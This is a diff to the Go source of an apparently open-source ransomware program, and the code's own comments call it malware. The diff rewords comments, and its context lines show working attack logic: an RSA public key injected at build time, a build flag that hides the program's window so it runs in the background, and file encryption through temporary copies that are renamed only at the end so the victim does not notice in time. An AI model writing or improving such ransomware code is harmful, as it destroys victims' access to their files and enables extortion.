@@ -22,7 +22,7 @@ import (
 
 var (
 	// RSA Public key
-	// Automatically injected on autobuild with make
+	// Automatically injected by make
 	PUB_KEY = []byte(`INJECT_PUB_KEY_HERE`)
 
 	// Time to keep trying persist new keys on server
@@ -36,7 +36,7 @@ var (
 )
 
 func init() {
-	// If you compile this program without -ldflags "-H windowsgui"
+	// If you compile this program without "-H windowsgui" ldflag
 	// you can see a console window with all actions performed by
 	// the malware. Otherwise, the prints above and all logs will be
 	// discarted and it will run in background
@@ -172,7 +172,7 @@ func encryptFiles() {
 
 					// We need make a temporary copy of the file for store the encrypted content
 					// before move then to the original file
-					// This is necessary because if the victim has many files it can observe the
+					// This is necessary because if has many files the victim can observe the
 					// encrypted names appear and turn off the computer before the process is completed
 					// The files will be renamed later, after all have been encrypted properly
 					//
@@ -184,14 +184,14 @@ func encryptFiles() {
 					}
 					defer tempFile.Close()
 
-					// Encrypt the file to the temporary file
+					// Encrypt the file sending the content to temporary file
 					err = file.Encrypt(keys["enckey"], tempFile)
 					if err != nil {
 						log.Println(err)
 						continue
 					}
 
-					//We need to close the tempFile manually before proceed
+					//We need close the tempFile manually before proceed
 					tempFile.Close()
 					// Here we can use os.Rename to move the tempFile to the
 					// original file
@@ -202,6 +202,8 @@ func encryptFiles() {
 					}
 
 					// Schedule the file to rename it later
+					//
+					// Protect the slice with a Mutex for prevent race condition
 					FilesToRename.Lock()
 					FilesToRename.Files = append(FilesToRename.Files, file)
 					FilesToRename.Unlock()
